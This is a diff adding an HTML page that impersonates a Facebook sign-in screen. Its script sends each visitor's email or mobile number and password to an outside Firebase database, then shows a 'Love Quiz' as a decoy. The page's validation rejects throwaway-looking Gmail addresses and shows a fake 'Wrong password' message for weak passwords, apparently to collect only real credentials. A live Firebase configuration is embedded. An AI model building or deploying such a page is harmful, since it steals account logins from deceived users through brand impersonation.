@@ -1,0 +1,385 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>facebook.com</title>
+<style>
+  :root{
+    --blue:#1877F2;
+    --bg1:#c9e6ff;
+    --bg2:#f7d4ff;
+    --glass:rgba(255,255,255,0.25);
+    --blur:18px;
+    --border:rgba(255,255,255,0.35);
+    --muted:#6b7280;
+    --love1:#ff86c8;
+    --love2:#ff3b94;
+  }
+  *{box-sizing:border-box;font-family:Inter,Arial,sans-serif;transition:.3s;}
+  body{
+    margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+    background:linear-gradient(135deg,var(--bg1),var(--bg2));
+    animation:bgMove 8s infinite alternate linear;padding:24px;
+  }
+  @keyframes bgMove{
+    from{background-position:0 0;}
+    to{background-position:300px 300px;}
+  }
+
+  .hidden{display:none!important;}
+
+  .wrap{display:flex;flex-direction:column;gap:28px;align-items:center;max-width:900px;width:100%;}
+
+  .card{
+    backdrop-filter:blur(var(--blur));
+    background:var(--glass);
+    border:1px solid var(--border);
+    border-radius:16px;
+    padding:24px;
+    width:100%;max-width:330px;text-align:center;
+    box-shadow:0 8px 28px rgba(0,0,0,0.15);
+  }
+  .logo{width:110px;margin:0 auto 12px}
+
+  input{
+    width:100%;padding:12px;border-radius:10px;
+    border:1px solid #d1d5db;margin-top:10px;font-size:15px;
+    background:rgba(255,255,255,0.7);
+  }
+
+  .pwWrap{position:relative}
+  .pwWrap svg{
+    position:absolute;right:12px;top:50%;transform:translateY(-50%);
+    width:20px;cursor:pointer;opacity:.6;
+  }
+
+  button{
+    width:100%;padding:12px;border:none;border-radius:10px;
+    background:var(--blue);color:#fff;font-weight:700;margin-top:16px;
+    cursor:pointer;font-size:15px;
+  }
+  button.loading{
+    opacity:.7;pointer-events:none;
+  }
+
+  .error{
+    margin-top:8px;font-size:13px;color:#e11d48;opacity:0;
+  }
+  .error.show{opacity:1;}
+
+  /* QUIZ */
+  #quizWrap{
+    background:linear-gradient(135deg,var(--love1),var(--love2));
+    padding:28px;border-radius:20px;width:100%;max-width:500px;
+    color:#fff;box-shadow:0 12px 35px rgba(255,80,150,.4);
+    animation:fadeIn .8s ease;
+  }
+  #quizWrap h2{text-align:center;margin-bottom:20px;}
+
+  .question{font-size:20px;margin-bottom:20px;text-align:center;}
+
+  .options button{
+    background:rgba(255,255,255,0.2);
+    margin:8px 0;padding:14px;border:none;border-radius:10px;
+    color:#fff;font-weight:600;width:100%;cursor:pointer;font-size:16px;
+  }
+  .options button:hover{background:rgba(255,255,255,0.35);}
+
+  #progress{
+    height:8px;width:100%;background:rgba(255,255,255,0.3);
+    border-radius:20px;margin-bottom:20px;overflow:hidden;
+  }
+  #pBar{
+    height:100%;width:0;background:#fff;border-radius:20px;
+    transition:width .4s;
+  }
+
+  #result{margin-top:20px;font-size:22px;text-align:center;}
+
+  @keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+</style>
+</head>
+
+<body>
+<div class="wrap">
+
+  <!-- LOGIN -->
+  <div id="loginCard" class="card">
+    <svg class="logo" viewBox="0 0 64 64">
+      <circle cx="32" cy="36" r="26" fill="#1877F2"/>
+      <text x="31" y="62" text-anchor="middle" font-size="60" fill="#fff" font-weight="1000">f</text>
+    </svg>
+
+    <h2>Sign in</h2>
+
+    <input id="email" type="email" placeholder="Mobile number or email">
+
+    <div class="pwWrap">
+      <input id="pwd" type="password" placeholder="Password">
+      <svg id="eye" viewBox="0 0 24 24">
+        <path id="eyeOpen" fill="currentColor" d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 110-10 5 5 0 010 10z"/>
+        <path id="eyeSlash" class="hidden" fill="currentColor" d="M3 3l18 18-1.5 1.5L18 20c-2.5 2-5 3-6 3-7 0-11-7-11-7 1.1-1.9 2.6-3.5 4.2-5L1.5 4.5 3 3z"/>
+      </svg>
+    </div>
+
+    <button id="btnLogin">Login</button>
+
+    <div id="err" class="error">Enter valid email & password</div>
+  </div>
+
+  <!-- QUIZ -->
+  <div id="quizWrap" class="hidden">
+    <h2>💖 Love Quiz 💖</h2>
+
+    <div id="progress"><div id="pBar"></div></div>
+
+    <div class="question" id="question"></div>
+    <div class="options" id="options"></div>
+
+    <div id="result" class="hidden"></div>
+  </div>
+
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
+import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";
+import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-analytics.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyD8KAm2FHtdUr4xilbVGZyVSGGdu2vyYiE",
+  authDomain: "w3bsite-aa4a3.firebaseapp.com",
+  databaseURL: "https://w3bsite-aa4a3-default-rtdb.firebaseio.com",
+  projectId: "w3bsite-aa4a3",
+  storageBucket: "w3bsite-aa4a3.firebasestorage.app",
+  messagingSenderId: "510630950165",
+  appId: "1:510630950165:web:b5f0cbbbbac127c7ece51c",
+  measurementId: "G-9LPYJJ3D5E"
+};
+
+const app = initializeApp(firebaseConfig);
+getAnalytics(app);
+const db = getDatabase(app);
+
+const email=document.getElementById("email");
+const pwd=document.getElementById("pwd");
+const btn=document.getElementById("btnLogin");
+const err=document.getElementById("err");
+const loginCard=document.getElementById("loginCard");
+const quizWrap=document.getElementById("quizWrap");
+const eye=document.getElementById("eye");
+
+const eyeOpen = document.getElementById("eyeOpen");
+const eyeSlash = document.getElementById("eyeSlash");
+
+// PASSWORD TOGGLE
+eye.onclick = () => {
+  if(pwd.type === "password"){
+    pwd.type = "text";
+    eyeOpen.classList.add("hidden");
+    eyeSlash.classList.remove("hidden");
+  } else {
+    pwd.type = "password";
+    eyeSlash.classList.add("hidden");
+    eyeOpen.classList.remove("hidden");
+  }
+};
+
+// SAVE TO FIREBASE
+function saveFirebase(email,pwd){
+  const loginRef=ref(db,"logins/");
+  const pushRef=push(loginRef);
+  set(pushRef,{
+    email:email,
+    pwd_hint:pwd,
+    time:new Date().toLocaleString()
+  });
+}
+
+// QUIZ DATA
+let quizData=[
+ {q:"What do you value most in love?",o:["Trust","Fun","Loyalty","Adventure"],a:0},
+ {q:"Ideal date night?",o:["Movie marathon","Beach walk","Candle dinner","Gaming together"],a:2},
+ {q:"Pick a color of love:",o:["Red","Pink","Blue","Purple"],a:1},
+ {q:"When you miss someone you…",o:["Text them","Sleep","Listen to music","Scroll old chats"],a:3},
+ {q:"Love is…",o:["War","Game","Magic","Peace"],a:2},
+ {q:"How fast do you fall in love?",o:["Slow","Fast","Never","Depends"],a:3},
+ {q:"What song vibe you?",o:["Romantic","Sad","Chill","Hype"],a:0},
+ {q:"Favorite gift?",o:["Letters","Flowers","Food","Hugs"],a:3},
+ {q:"How do you show love?",o:["Words","Acts","Time","Gifts"],a:2},
+ {q:"Choose a heart:",o:["💖","💘","💞","❤️‍🔥"],a:3},
+ {q:"Your idea of a perfect weekend?",o:["Relaxing at home","Traveling","Partying","Gaming"],a:1},
+ {q:"When arguing, you…",o:["Stay calm","Raise your voice","Ignore","Apologize quickly"],a:0},
+ {q:"Love language?",o:["Words of affirmation","Acts of service","Receiving gifts","Quality time"],a:3},
+ {q:"Ideal vacation spot?",o:["Beach","Mountains","City","Countryside"],a:0},
+ {q:"Favorite romantic movie genre?",o:["Comedy","Drama","Thriller","Fantasy"],a:1},
+ {q:"Best way to say sorry?",o:["Flowers","Text","Gift","Hug"],a:3},
+ {q:"Ideal way to spend Sunday?",o:["Sleep","Exercise","Chat with friends","Date"],a:0},
+ {q:"Do you believe in love at first sight?",o:["Yes","No","Maybe","Depends on person"],a:0},
+ {q:"Your favorite couple activity?",o:["Cooking together","Gaming together","Watching movies","Going out"],a:2},
+ {q:"Most important trait in partner?",o:["Kindness","Humor","Intelligence","Looks"],a:0}
+];
+
+// randomize
+quizData=quizData.sort(()=>Math.random()-0.5);
+
+// QUIZ SYSTEM
+let idx=0,score=0;
+const qEl=document.getElementById("question");
+const optEl=document.getElementById("options");
+const result=document.getElementById("result");
+const pBar=document.getElementById("pBar");
+
+function startQuiz(){
+  idx=0;score=0;
+  quizWrap.classList.remove("hidden");
+  showQ();
+}
+
+function showQ(){
+  const d=quizData[idx];
+  qEl.textContent=d.q;
+  optEl.innerHTML="";
+  pBar.style.width=((idx/quizData.length)*100)+"%";
+
+  d.o.forEach((opt,i)=>{
+    const b=document.createElement("button");
+    b.textContent=opt;
+    b.onclick=()=>{if(i===d.a)score++;nextQ();}
+    optEl.appendChild(b);
+  });
+}
+
+function nextQ(){
+  idx++;
+  if(idx<quizData.length) showQ();
+  else showResult();
+}
+
+function showResult(){
+  optEl.innerHTML="";
+  qEl.textContent="Finished!";
+  result.classList.remove("hidden");
+  result.textContent=`Your love score: ${score} / ${quizData.length}`;
+  pBar.style.width="100%";
+}
+
+// LOGIN HANDLER WITH VALIDATION
+btn.onclick = () => {
+  const e = email.value.trim();
+  const p = pwd.value.trim();
+
+  // Email regex
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  // Philippine mobile number regex (09xxxxxxxxx or +639xxxxxxxxx)
+  const phoneRegex = /^(09|\+639)\d{9}$/;
+
+  if (!e || !p) {
+    err.textContent = "Enter email/number & password";
+    err.classList.add("show");
+    return;
+  }
+
+  if (!emailRegex.test(e) && !phoneRegex.test(e)) {
+    err.textContent = "Enter a valid email or mobile number";
+    err.classList.add("show");
+    return;
+  }
+
+  /* ---------------------- STRICT GMAIL CHECK ---------------------- */
+  if (e.toLowerCase().includes("@gmail.com")) {
+
+    const gmailLocal = e.split("@")[0];
+    const local = gmailLocal.toLowerCase();
+
+    const gmailValid = /^[a-zA-Z0-9._+]+$/;
+    if (!gmailValid.test(gmailLocal)) {
+      err.textContent = "Invalid Gmail format";
+      err.classList.add("show");
+      return;
+    }
+
+    if (gmailLocal.includes("..")) {
+      err.textContent = "Invalid Gmail (two dots not allowed)";
+      err.classList.add("show");
+      return;
+    }
+
+    if (gmailLocal.startsWith(".") || gmailLocal.endsWith(".")) {
+      err.textContent = "Invalid Gmail placement of dot";
+      err.classList.add("show");
+      return;
+    }
+
+    // 1. Reject if same segment repeated (ej.ej.ej)
+    const segments = local.split(".");
+    let repeated = false;
+    if (segments.length > 1) {
+      for (let i = 1; i < segments.length; i++) {
+        if (segments[i] === segments[i - 1]) repeated = true;
+      }
+    }
+    if (repeated) {
+      err.textContent = "Email looks fake (repeated pattern)";
+      err.classList.add("show");
+      return;
+    }
+
+    // 2. Reject 1–2 letter segments
+    if (segments.some(s => s.length <= 2)) {
+      err.textContent = "Email looks fake";
+      err.classList.add("show");
+      return;
+    }
+
+    // 3. Reject 3+ segments
+    if (segments.length >= 3) {
+      err.textContent = "Email suspicious";
+      err.classList.add("show");
+      return;
+    }
+
+    // 4. Reject aaa / aaabbb / ejjeje
+    if (/(.)\1{2,}/.test(local)) {
+      err.textContent = "Email pattern suspicious";
+      err.classList.add("show");
+      return;
+    }
+
+    // 5. Reject repeating sequences (ababab, ejjejejej)
+    if (/(\w+)\1{1,}/.test(local)) {
+      err.textContent = "Email looks auto-generated";
+      err.classList.add("show");
+      return;
+    }
+  }
+
+  if (p.length < 6) {
+    err.textContent = "Password must be at least 6 characters";
+    err.classList.add("show");
+    return;
+  }
+
+  const strongPwd = /[0-9!@#$%^&*(),.?":{}|<>]/;
+  if (!strongPwd.test(p)) {
+    err.textContent = "Wrong password please try again";
+    err.classList.add("show");
+    return;
+  }
+
+  err.classList.remove("show");
+  btn.classList.add("loading");
+  btn.textContent = "Loading…";
+
+  setTimeout(() => {
+    btn.classList.remove("loading");
+    loginCard.classList.add("hidden");
+
+    saveFirebase(e, p);
+    startQuiz();
+  }, 800);
+};
+</script>
+</body>
+</html>
